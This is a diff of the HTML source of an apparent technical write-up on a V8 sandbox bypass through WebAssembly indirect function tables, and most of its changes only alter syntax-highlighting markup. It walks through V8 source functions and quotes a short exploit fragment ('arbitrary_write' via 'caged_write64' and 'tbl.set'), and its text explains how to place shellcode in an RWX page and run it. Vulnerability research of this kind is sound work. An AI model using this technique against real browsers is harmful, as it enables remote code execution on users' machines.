-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                    Address call_target, Object ref)&lt;/span&gt; &lt;/span&gt;{
-  &lt;span class=&#34;hljs-built_in&#34;&gt;sig_ids&lt;/span&gt;()[index] = sig_id;
-  &lt;span class=&#34;hljs-built_in&#34;&gt;targets&lt;/span&gt;()[index] = call_target;
-  &lt;span class=&#34;hljs-built_in&#34;&gt;refs&lt;/span&gt;().&lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt;(index, ref);
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmIndirectFunctionTable::Set&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;uint32_t&lt;/span&gt; index, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; sig_id,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                    Address call_target, Object ref)&lt;/span&gt; &lt;/span&gt;{
+  sig_ids()[index] = sig_id;
+  targets()[index] = call_target;
+  refs().&lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt;(index, ref);
 }&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Looking at the code, we can confirm that the &lt;code&gt;call_target&lt;/code&gt; value passed as an argument is written to the memory location pointed to by &lt;code&gt;targets&lt;/code&gt;. The core realization here was that if an attacker could manipulate this location, it would enable an arbitrary write primitive.&lt;/p&gt;
 &lt;p&gt;The next piece of information needed was to verify whether &lt;code&gt;call_target&lt;/code&gt; is a value the attacker can control, and if so, what address it should be directed to point to. First of all, the &lt;code&gt;WasmIndirectFunctionTable::Set()&lt;/code&gt; function is called inside &lt;code&gt;WasmTableObject::Set()&lt;/code&gt;, which can be triggered via the JavaScript API &lt;code&gt;WebAssembly.Table.prototype.set()&lt;/code&gt;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// https://github.com/theori-io/v8-sbx-bypass-wasm&lt;/span&gt;
 
-  &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;arbitrary_write&lt;/span&gt; = (&lt;span class=&#34;hljs-params&#34;&gt;where, what&lt;/span&gt;) =&amp;gt; {
-    &lt;span class=&#34;hljs-title function_&#34;&gt;caged_write64&lt;/span&gt;(where_ptr, where - &lt;span class=&#34;hljs-number&#34;&gt;0x8n&lt;/span&gt;);
-    &lt;span class=&#34;hljs-title function_&#34;&gt;caged_write64&lt;/span&gt;(what_ptr, what);
-    tbl.&lt;span class=&#34;hljs-title function_&#34;&gt;set&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, times2);
-    &lt;span class=&#34;hljs-title function_&#34;&gt;caged_write64&lt;/span&gt;(what_ptr, rwx);
-    &lt;span class=&#34;hljs-title function_&#34;&gt;caged_write64&lt;/span&gt;(where_ptr, targets);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arbitrary_write = &lt;span class=&#34;hljs-function&#34;&gt;(&lt;span class=&#34;hljs-params&#34;&gt;where, what&lt;/span&gt;) =&amp;gt;&lt;/span&gt; {
+    caged_write64(where_ptr, where - &lt;span class=&#34;hljs-number&#34;&gt;0x8n&lt;/span&gt;);
+    caged_write64(what_ptr, what);
+    tbl.set(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, times2);
+    caged_write64(what_ptr, rwx);
+    caged_write64(where_ptr, targets);
   };
   
 &lt;span class=&#34;hljs-comment&#34;&gt;// ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;This corresponds to the &lt;code&gt;tbl.set()&lt;/code&gt; call in the publicly available PoC example. The &lt;code&gt;index&lt;/code&gt; passed as an argument was not an issue since it directly uses the value provided by the user. However, for &lt;code&gt;call_target&lt;/code&gt;, the caller utilizes the return value of &lt;code&gt;WasmInstanceObject::GetCallTarget()&lt;/code&gt;.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;Address &lt;span class=&#34;hljs-title&#34;&gt;WasmInstanceObject::GetCallTarget&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-type&#34;&gt;uint32_t&lt;/span&gt; func_index)&lt;/span&gt; &lt;/span&gt;{
-  wasm::NativeModule* native_module = &lt;span class=&#34;hljs-built_in&#34;&gt;module_object&lt;/span&gt;().&lt;span class=&#34;hljs-built_in&#34;&gt;native_module&lt;/span&gt;();
-  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (func_index &amp;lt; native_module-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;num_imported_functions&lt;/span&gt;()) {
-    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;imported_function_targets&lt;/span&gt;().&lt;span class=&#34;hljs-built_in&#34;&gt;get&lt;/span&gt;(func_index);
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;Address &lt;span class=&#34;hljs-title&#34;&gt;WasmInstanceObject::GetCallTarget&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;uint32_t&lt;/span&gt; func_index)&lt;/span&gt; &lt;/span&gt;{
+  wasm::NativeModule* native_module = module_object().native_module();
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (func_index &amp;lt; native_module-&amp;gt;num_imported_functions()) {
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; imported_function_targets().get(func_index);
   }
-  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;jump_table_start&lt;/span&gt;() +
-         &lt;span class=&#34;hljs-built_in&#34;&gt;JumpTableOffset&lt;/span&gt;(native_module-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;module&lt;/span&gt;(), func_index);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; jump_table_start() +
+         JumpTableOffset(native_module-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;module&lt;/span&gt;(), func_index);
 }&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Since the return value of this function was determined by &lt;code&gt;func_index&lt;/code&gt;, it posed a significant constraint on specifying an arbitrary address. If &lt;code&gt;func_index&lt;/code&gt; falls within the range of imported functions, the value is returned from &lt;code&gt;imported_function_targets&lt;/code&gt;; otherwise, it returns an address calculated by adding an offset to &lt;code&gt;jump_table_start()&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;imported_function_targets&lt;/code&gt; is a field that holds the locations of functions passed from the outside during instance creation. Debugging the pointers it references internally confirms that they point directly to an RWX memory region.&lt;/p&gt;
@@ -825,23 +825,23 @@ Modified memory (dirty) page list provided, 0 entries.&lt;/code&gt;&lt;/pre&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// wasm/wasm-objects.cc&lt;/span&gt;
 
 &lt;span class=&#34;hljs-comment&#34;&gt;// TODO(manoskouk): Does this need to be handlified?&lt;/span&gt;
-&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmTableObject::Set&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Isolate* isolate, Handle&amp;lt;WasmTableObject&amp;gt; table,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                          &lt;span class=&#34;hljs-type&#34;&gt;uint32_t&lt;/span&gt; index, Handle&amp;lt;Object&amp;gt; entry)&lt;/span&gt; &lt;/span&gt;{
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmTableObject::Set&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Isolate* isolate, Handle&amp;lt;WasmTableObject&amp;gt; table,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                          &lt;span class=&#34;hljs-keyword&#34;&gt;uint32_t&lt;/span&gt; index, Handle&amp;lt;Object&amp;gt; entry)&lt;/span&gt; &lt;/span&gt;{
   &lt;span class=&#34;hljs-comment&#34;&gt;// Callers need to perform bounds checks, type check, and error handling.&lt;/span&gt;
-  &lt;span class=&#34;hljs-built_in&#34;&gt;DCHECK&lt;/span&gt;(&lt;span class=&#34;hljs-built_in&#34;&gt;IsInBounds&lt;/span&gt;(isolate, table, index));
+  DCHECK(IsInBounds(isolate, table, index));
 
   &lt;span class=&#34;hljs-function&#34;&gt;Handle&amp;lt;FixedArray&amp;gt; &lt;span class=&#34;hljs-title&#34;&gt;entries&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(table-&amp;gt;entries(), isolate)&lt;/span&gt;&lt;/span&gt;;
   &lt;span class=&#34;hljs-comment&#34;&gt;// The FixedArray is addressed with int&amp;apos;s.&lt;/span&gt;
-  &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; entry_index = &lt;span class=&#34;hljs-built_in&#34;&gt;static_cast&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt;&amp;gt;(index);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; entry_index = &lt;span class=&#34;hljs-keyword&#34;&gt;static_cast&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;&amp;gt;(index);
 
-  &lt;span class=&#34;hljs-keyword&#34;&gt;switch&lt;/span&gt; (table-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;type&lt;/span&gt;().&lt;span class=&#34;hljs-built_in&#34;&gt;heap_representation&lt;/span&gt;()) {
+  &lt;span class=&#34;hljs-keyword&#34;&gt;switch&lt;/span&gt; (table-&amp;gt;type().heap_representation()) {
 &lt;span class=&#34;hljs-comment&#34;&gt;// ...&lt;/span&gt;
     &lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;:
-      &lt;span class=&#34;hljs-built_in&#34;&gt;DCHECK&lt;/span&gt;(!table-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;instance&lt;/span&gt;().&lt;span class=&#34;hljs-built_in&#34;&gt;IsUndefined&lt;/span&gt;());
-      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WasmInstanceObject::&lt;span class=&#34;hljs-built_in&#34;&gt;cast&lt;/span&gt;(table-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;instance&lt;/span&gt;())
-              .&lt;span class=&#34;hljs-built_in&#34;&gt;module&lt;/span&gt;()
-              -&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;has_signature&lt;/span&gt;(table-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;type&lt;/span&gt;().&lt;span class=&#34;hljs-built_in&#34;&gt;ref_index&lt;/span&gt;())) {
-        &lt;span class=&#34;hljs-built_in&#34;&gt;SetFunctionTableentry&lt;/span&gt;(isolate, table, entries, entry_index, entry); &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;lt;== here&lt;/span&gt;
+      DCHECK(!table-&amp;gt;instance().IsUndefined());
+      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WasmInstanceObject::cast(table-&amp;gt;instance())
+              .&lt;span class=&#34;hljs-keyword&#34;&gt;module&lt;/span&gt;()
+              -&amp;gt;has_signature(table-&amp;gt;type().ref_index())) {
+        SetFunctionTableentry(isolate, table, entries, entry_index, entry); &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;lt;== here&lt;/span&gt;
         &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
       }
       entries-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt;(entry_index, *entry);
@@ -851,54 +851,54 @@ Modified memory (dirty) page list provided, 0 entries.&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Inside this function, a &lt;code&gt;switch-case&lt;/code&gt; statement is used to route the execution to different processing functions based on the table&amp;#x2019;s type. Since the target function we want to reach requires passing through &lt;code&gt;SetFunctionTableentry()&lt;/code&gt;, it is processed under the &lt;code&gt;default&lt;/code&gt; case, which does not match any of the predefined conditions.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// wasm/wasm-objects.cc&lt;/span&gt;
 
-&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmTableObject::SetFunctionTableentry&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Isolate* isolate,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                            Handle&amp;lt;WasmTableObject&amp;gt; table,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                            Handle&amp;lt;FixedArray&amp;gt; entries,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                            &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; entry_index,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                            Handle&amp;lt;Object&amp;gt; entry)&lt;/span&gt; &lt;/span&gt;{
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmTableObject::SetFunctionTableentry&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Isolate* isolate,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                            Handle&amp;lt;WasmTableObject&amp;gt; table,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                            Handle&amp;lt;FixedArray&amp;gt; entries,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                            &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; entry_index,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                            Handle&amp;lt;Object&amp;gt; entry)&lt;/span&gt; &lt;/span&gt;{
 &lt;span class=&#34;hljs-comment&#34;&gt;// ...&lt;/span&gt;
-  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WasmExportedFunction::&lt;span class=&#34;hljs-built_in&#34;&gt;IsWasmExportedFunction&lt;/span&gt;(*external)) {  &lt;span class=&#34;hljs-comment&#34;&gt;// Check is exported&lt;/span&gt;
-    &lt;span class=&#34;hljs-keyword&#34;&gt;auto&lt;/span&gt; exported_function = Handle&amp;lt;WasmExportedFunction&amp;gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;cast&lt;/span&gt;(external);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WasmExportedFunction::IsWasmExportedFunction(*external)) {  &lt;span class=&#34;hljs-comment&#34;&gt;// Check is exported&lt;/span&gt;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;auto&lt;/span&gt; exported_function = Handle&amp;lt;WasmExportedFunction&amp;gt;::cast(external);
     &lt;span class=&#34;hljs-function&#34;&gt;Handle&amp;lt;WasmInstanceObject&amp;gt; &lt;span class=&#34;hljs-title&#34;&gt;target_instance&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(exported_function-&amp;gt;instance(),&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                               isolate)&lt;/span&gt;&lt;/span&gt;;
-    &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; func_index = exported_function-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;function_index&lt;/span&gt;();
-    &lt;span class=&#34;hljs-keyword&#34;&gt;auto&lt;/span&gt;* wasm_function = &amp;amp;target_instance-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;module&lt;/span&gt;()-&amp;gt;functions[func_index];
-    &lt;span class=&#34;hljs-built_in&#34;&gt;UpdateDispatchTables&lt;/span&gt;(isolate, *table, entry_index, wasm_function,
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                               isolate)&lt;/span&gt;&lt;/span&gt;;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; func_index = exported_function-&amp;gt;function_index();
+    &lt;span class=&#34;hljs-keyword&#34;&gt;auto&lt;/span&gt;* wasm_function = &amp;amp;target_instance-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;module&lt;/span&gt;()-&amp;gt;functions[func_index];
+    UpdateDispatchTables(isolate, *table, entry_index, wasm_function,
                          *target_instance);
-  } &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WasmJSFunction::&lt;span class=&#34;hljs-built_in&#34;&gt;IsWasmJSFunction&lt;/span&gt;(*external)) {
-    &lt;span class=&#34;hljs-built_in&#34;&gt;UpdateDispatchTables&lt;/span&gt;(isolate, table, entry_index,
-                         Handle&amp;lt;WasmJSFunction&amp;gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;cast&lt;/span&gt;(external));
+  } &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WasmJSFunction::IsWasmJSFunction(*external)) {
+    UpdateDispatchTables(isolate, table, entry_index,
+                         Handle&amp;lt;WasmJSFunction&amp;gt;::cast(external));
   } &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
-    &lt;span class=&#34;hljs-built_in&#34;&gt;DCHECK&lt;/span&gt;(WasmCapiFunction::&lt;span class=&#34;hljs-built_in&#34;&gt;IsWasmCapiFunction&lt;/span&gt;(*external));
-    &lt;span class=&#34;hljs-built_in&#34;&gt;UpdateDispatchTables&lt;/span&gt;(isolate, table, entry_index,
-                         Handle&amp;lt;WasmCapiFunction&amp;gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;cast&lt;/span&gt;(external));
+    DCHECK(WasmCapiFunction::IsWasmCapiFunction(*external));
+    UpdateDispatchTables(isolate, table, entry_index,
+                         Handle&amp;lt;WasmCapiFunction&amp;gt;::cast(external));
   }
   entries-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt;(entry_index, *entry);
 }&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Inside the &lt;code&gt;WasmTableObject::SetFunctionTableentry()&lt;/code&gt; function, the behavior varies depending on the location of the target function. The vulnerable logic can be reached specifically when the function is &amp;#x2018;exported&amp;#x2019;. The other two cases, despite sharing the same function name, are handled by overloaded functions with different parameters, so careful attention is required.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// static&lt;/span&gt;
-&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmTableObject::UpdateDispatchTables&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Isolate* isolate,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                           WasmTableObject table,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                           &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; entry_index,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                           &lt;span class=&#34;hljs-type&#34;&gt;const&lt;/span&gt; wasm::WasmFunction* func,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                           WasmInstanceObject target_instance)&lt;/span&gt; &lt;/span&gt;{
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmTableObject::UpdateDispatchTables&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Isolate* isolate,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                           WasmTableObject table,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                           &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; entry_index,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                           &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; wasm::WasmFunction* func,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                           WasmInstanceObject target_instance)&lt;/span&gt; &lt;/span&gt;{
 &lt;span class=&#34;hljs-comment&#34;&gt;// ...&lt;/span&gt;
 
-  Address call_target = target_instance.&lt;span class=&#34;hljs-built_in&#34;&gt;GetCallTarget&lt;/span&gt;(func-&amp;gt;func_index);
+  Address call_target = target_instance.GetCallTarget(func-&amp;gt;func_index);
 
-  &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; original_sig_id = func-&amp;gt;sig_index;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; original_sig_id = func-&amp;gt;sig_index;
 
-  &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, len = dispatch_tables.&lt;span class=&#34;hljs-built_in&#34;&gt;length&lt;/span&gt;(); i &amp;lt; len;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, len = dispatch_tables.length(); i &amp;lt; len;
        i += kDispatchTablenumElements) {
-    &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; table_index =
-        Smi::&lt;span class=&#34;hljs-built_in&#34;&gt;cast&lt;/span&gt;(dispatch_tables.&lt;span class=&#34;hljs-built_in&#34;&gt;get&lt;/span&gt;(i + kDispatchTableIndexOffset)).&lt;span class=&#34;hljs-built_in&#34;&gt;value&lt;/span&gt;();
-    WasmInstanceObject instance = WasmInstanceObject::&lt;span class=&#34;hljs-built_in&#34;&gt;cast&lt;/span&gt;(
-        dispatch_tables.&lt;span class=&#34;hljs-built_in&#34;&gt;get&lt;/span&gt;(i + kDispatchTableInstanceOffset));
-    &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; sig_id = target_instance.&lt;span class=&#34;hljs-built_in&#34;&gt;module&lt;/span&gt;()
+    &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; table_index =
+        Smi::cast(dispatch_tables.get(i + kDispatchTableIndexOffset)).value();
+    WasmInstanceObject instance = WasmInstanceObject::cast(
+        dispatch_tables.get(i + kDispatchTableInstanceOffset));
+    &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; sig_id = target_instance.&lt;span class=&#34;hljs-keyword&#34;&gt;module&lt;/span&gt;()
                      -&amp;gt;isorecursive_canonical_type_ids[original_sig_id];
-    WasmIndirectFunctionTable ift = WasmIndirectFunctionTable::&lt;span class=&#34;hljs-built_in&#34;&gt;cast&lt;/span&gt;(
-        instance.&lt;span class=&#34;hljs-built_in&#34;&gt;indirect_function_tables&lt;/span&gt;().&lt;span class=&#34;hljs-built_in&#34;&gt;get&lt;/span&gt;(table_index));
-    ift.&lt;span class=&#34;hljs-built_in&#34;&gt;Set&lt;/span&gt;(entry_index, sig_id, call_target, call_ref);
+    WasmIndirectFunctionTable ift = WasmIndirectFunctionTable::cast(
+        instance.indirect_function_tables().get(table_index));
+    ift.Set(entry_index, sig_id, call_target, call_ref);
   }
 }&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Once we reach the &lt;code&gt;WasmTableObject::UpdateDispatchTables()&lt;/code&gt; function, we can finally observe the previously explained &lt;code&gt;GetCallTarget()&lt;/code&gt; and &lt;code&gt;WasmIndirectFunctionTable::Set()&lt;/code&gt; functions in action.&lt;/p&gt;
@@ -932,28 +932,28 @@ Modified memory (dirty) page list provided, 0 entries.&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Once arbitrary address write is achieved, executing arbitrary code becomes possible as well.&lt;/p&gt;
 &lt;p&gt;Since the process above writes 8 bytes (corresponding to a pointer size) to an arbitrary address, you can write the desired shellcode into the RWX page 8 bytes at a time, and then call it to execute the injected shellcode.&lt;/p&gt;
 &lt;h4 id=&#34;3-1-4-Wasm-Syntax&#34;&gt;&lt;a href=&#34;#3-1-4-Wasm-Syntax&#34; class=&#34;headerlink&#34; title=&#34;3.1.4. Wasm Syntax&#34;&gt;&lt;/a&gt;3.1.4. Wasm Syntax&lt;/h4&gt;&lt;p&gt;Before exploring the bypass method using JIT, let&amp;#x2019;s take a quick look at the Wasm syntax used in the exploit!&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;hljs wasm&#34;&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;module&lt;/span&gt;
-  &lt;span class=&#34;hljs-comment&#34;&gt;;; The common type we use throughout the sample.&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;param&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)))&lt;/span&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs wasm&#34;&gt;(module
+  ;; The common type we use throughout the sample.
+  (type $int2int (func (param i32) (result i32)))
 
-  &lt;span class=&#34;hljs-comment&#34;&gt;;; Import a function named jstimes3 from the environment and call it&lt;/span&gt;
-  &lt;span class=&#34;hljs-comment&#34;&gt;;; $jstimes3 here.&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;env&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;jstimes3&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$jstimes3&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)))&lt;/span&gt;
+  ;; Import a function named jstimes3 from the environment and call it
+  ;; $jstimes3 here.
+  (import &amp;quot;env&amp;quot; &amp;quot;jstimes3&amp;quot; (func $jstimes3 (type $int2int)))
 
